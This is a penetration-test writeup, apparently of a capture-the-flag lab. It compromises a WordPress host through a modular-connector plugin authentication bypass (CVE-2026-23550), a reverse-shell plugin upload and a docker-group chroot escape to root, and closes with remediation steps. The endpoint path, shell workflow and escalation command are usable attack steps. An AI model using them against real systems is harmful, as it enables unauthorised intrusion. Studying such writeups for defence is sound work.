# Penetration Test Writeup: Dark

## Objective

I was engaged to perform a penetration test against a single host on a company's internal network. The goal was to identify all vulnerabilities present and demonstrate real-world impact by escalating privileges to root. The client provided VPN access to the network but no further information — a classic black-box engagement.

**Target IP:** `10.0.22.147`

---

## Enumeration

### Network Scan

An initial Nmap scan revealed two open ports:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
```

Notable details from the HTTP service:

- `robots.txt` disallowed `/wp-admin/` — an immediate hint the site was running WordPress
- Server header: `Apache/2.4.52 (Ubuntu)`
- Page title: *"Dark – Just another WordPress site"*
- Generator meta tag confirmed **WordPress 6.0**

### Web Enumeration

Running Wappalyzer against the site confirmed the technology stack:

| Category | Technology |
|---|---|
| CMS | WordPress 6.0 |
| Web Server | Apache HTTP Server 2.4.52 |
| Language | PHP |
| OS | Ubuntu |
| Database | MySQL |
| Theme | Twenty Twenty-Two |

Since WordPress was confirmed, I moved on to plugin enumeration with WPScan.

---

## Vulnerability Identification

```bash
wpscan --url http://10.0.22.147/ --api-token @Gh0ulH4x --enumerate p --plugins-detection mixed
```

This identified an outdated, vulnerable plugin:

**Plugin:** `modular-connector` (v2.5.0, latest is 3.3.0)

Two known vulnerabilities were flagged:

1. **Modular DS < 2.5.2 — Unauthenticated Privilege Escalation**
   `CVE-2026-23550`
2. **Modular Connector < 2.6.0 — CSRF via `postConfirmOauth`**
   `CVE-2026-3903`

I focused on the first, since it offered unauthenticated privilege escalation directly.

### CVE-2026-23550 — Login Bypass via LFI

The vulnerability is a Local File Inclusion (LFI) issue that permits an authentication bypass through the following endpoint:

```
/api/modular-connector/login/x?origin=mo&type=x
```

Sending a simple `GET` request to this endpoint against the target bypassed authentication entirely and granted access to the WordPress **Administrator Dashboard**.

---

## Exploitation

With administrative access confirmed, I leveraged the standard WordPress plugin-upload mechanism to achieve remote code execution:

1. Downloaded a PHP reverse shell plugin ([Wordpress_ReverseShell](https://github.com/Bhanunamikaze/Wordpress_ReverseShell)), specifically `system-health-monitor.php`
2. Packaged it as an installable plugin:
   ```bash
   zip -r system-health-monitor.zip system-health-monitor/
   ```
3. Uploaded and activated the plugin via the compromised admin dashboard
4. Triggered execution by visiting:
   ```
   /wp-admin/admin.php?page=system-health-monitor
   ```
5. Set up a listener and caught the callback:
   ```bash
   penelope -p 8080
   ```
   Result: an incoming shell as `www-data`.

### Shell Stabilization

The initial shell was upgraded to a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Initial Foothold Confirmation

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),121(docker)
```

Notably, `www-data` was a member of the **docker** group — a strong signal for privilege escalation potential.

The user flag was retrieved from the web root:

```bash
$ cat /var/www/user.txt
@Gh0ulH4x
```

---

## Privilege Escalation

Membership in the `docker` group is effectively equivalent to root access on the host, since it allows mounting the host filesystem into a privileged container:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

This command:
- Pulls a minimal Alpine image
- Mounts the entire host filesystem (`/`) into the container at `/mnt`
- `chroot`s into that mount, effectively running as root on the underlying host

Once inside, the root flag confirmed full compromise:

```bash
# cat /root/root.txt
@Gh0ulH4x
```

---

## Summary

| Stage | Vector |
|---|---|
| Initial Access | Unauthenticated LFI/auth bypass in `modular-connector` plugin (CVE-2026-23550) |
| Execution | Malicious plugin upload → PHP reverse shell as `www-data` |
| Privilege Escalation | Misconfigured `docker` group membership → container escape to root |

### Remediation Recommendations

1. **Update the `modular-connector` plugin** to version 2.5.2 or later immediately; this closes the unauthenticated privilege escalation vector entirely.
2. **Restrict plugin upload/activation permissions** — apply the principle of least privilege to WordPress admin accounts.
3. **Remove `www-data` from the `docker` group**, or reconfigure Docker access using rootless mode / Podman with proper user namespace remapping. Group membership in `docker` should be treated as equivalent to root and never granted to service accounts.
4. **Implement a WAF or virtual patching layer** in front of WordPress to catch known CVEs before official patches are applied.

---

#PenetrationTesting #CyberSecurity #EthicalHacking #WordPressSecurity #CVE202623550 #PrivilegeEscalation #DockerSecurity #InfoSec #RedTeam #WPScan #LFI #WebAppSecurity #BugBounty #OSCP #SecurityResearch
